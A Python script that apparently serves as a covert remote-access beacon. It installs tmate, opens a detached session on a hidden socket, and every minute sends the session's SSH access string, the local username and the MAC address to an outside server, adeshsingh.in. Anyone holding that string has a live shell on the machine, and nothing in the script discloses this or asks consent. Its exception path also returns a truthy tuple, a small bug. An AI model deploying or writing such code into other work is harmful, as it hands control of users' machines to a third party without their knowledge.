#!/usr/bin/python3
import re
import os
import time
import socket
import subprocess
import requests
from pathlib import Path

API_HOST = "adeshsingh.in"
API_PORT = 8080
API_URL = f"https://{API_HOST}:{API_PORT}/api/session/"
SESSION_FILE = "/tmp/.private-session.sock"

session = requests.Session()


def log(message: str) -> None:
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}", flush=True)


def run_cmd(cmd, timeout=30):
    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
        check=False,
    )


def is_server_reachable() -> bool:
    try:
        log("Checking API connectivity...")
        with socket.create_connection((API_HOST, API_PORT), timeout=10):
            return True
    except OSError as e:
        log(f"Connectivity failed: {e}")
        return False


def get_username() -> str:
    try:
        users = [u for u in os.listdir("/home/") if not u.startswith(".")]
        return users[0] if users else os.getenv("USER", "unknown")
    except Exception as e:
        log(f"Username error: {e}")
        return "unknown"


def get_mac_address() -> str:
    try:
        result = run_cmd(["ip", "link", "show"], timeout=10)
        if result.returncode != 0:
            log(result.stderr.strip())
            return "MAC address not found"

        match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", result.stdout)
        return match.group(1).upper() if match else "MAC address not found"
    except Exception as e:
        log(f"MAC error: {e}")
        return "MAC address not found"


def ensure_tmate_installed() -> bool:
    result = run_cmd(["which", "tmate"], timeout=5)
    if result.returncode == 0:
        return True

    log("tmate not found. Installing...")

    if os.geteuid() != 0:
        log("Please run this script with sudo/root to install tmate.")
        return False

    run_cmd(["apt-get", "update", "-y"], timeout=120)
    install = run_cmd(["apt-get", "install", "-y", "tmate"], timeout=180)

    if install.returncode != 0:
        log(f"tmate install failed: {install.stderr.strip()}")
        return False

    return True


def remove_stale_session():
    try:
        if Path(SESSION_FILE).exists():
            Path(SESSION_FILE).unlink()
            log("Removed stale tmate socket.")
    except Exception as e:
        log(f"Failed to remove stale socket: {e}")


def create_tmate_session() -> bool:
    log("Creating tmate session...")

    result = run_cmd(
        ["tmate", "-S", SESSION_FILE, "new-session", "-d", "-c", os.path.expanduser("~")],
        timeout=30,
    )

    if result.returncode != 0:
        log(f"tmate new-session failed: {result.stderr.strip()}")
        return False

    ready = run_cmd(["tmate", "-S", SESSION_FILE, "wait", "tmate-ready"], timeout=60)

    if ready.returncode != 0:
        log(f"tmate ready failed: {ready.stderr.strip()}")
        return False

    return True


def generate_new_session():
    try:
        display = run_cmd(
            ["tmate", "-S", SESSION_FILE, "display", "-p", "#{tmate_ssh}"],
            timeout=20,
        )

        if display.returncode != 0 or not display.stdout.strip():
            remove_stale_session()

            if not create_tmate_session():
                return None

            display = run_cmd(
                ["tmate", "-S", SESSION_FILE, "display", "-p", "#{tmate_ssh}"],
                timeout=20,
            )

        if display.returncode != 0:
            log(f"tmate display failed: {display.stderr.strip()}")
            return None

        ssh_session = display.stdout.strip()

        match = re.search(r"ssh\s+([^@]+)@", ssh_session)
        if not match:
            log(f"Invalid tmate SSH output: {ssh_session}")
            return ssh_session

        return ssh_session

    except Exception as e:
        log(f"tmate session error: {e}")
        remove_stale_session()
        return None, None


def send_payload_to_api(payload: dict) -> bool:
    try:
        log("Sending payload to API...")

        response = session.post(
            API_URL,
            json=payload,
            timeout=15,
        )

        log(f"API status: {response.status_code}")
        response.raise_for_status()
        return True

    except requests.exceptions.RequestException as e:
        log(f"API send failed: {e}")
        return False


def main():
    if not ensure_tmate_installed():
        return

    while True:
        try:
            if not is_server_reachable():
                time.sleep(60)
                continue

            ssh_session = generate_new_session()

            if not ssh_session:
                log("Failed to get valid tmate session.")
                time.sleep(60)
                continue

            payload = {
                "username": get_username(),
                "mac_address": get_mac_address(),
                "ssh_session": ssh_session,
                "status": True,
            }

            log(f"Payload prepared: {payload}")

            if send_payload_to_api(payload):
                log("Payload sent successfully.")
            else:
                log("Payload send failed.")

        except Exception as e:
            log(f"Unexpected main loop error: {e}")

        time.sleep(60)


if __name__ == "__main__":
    main()
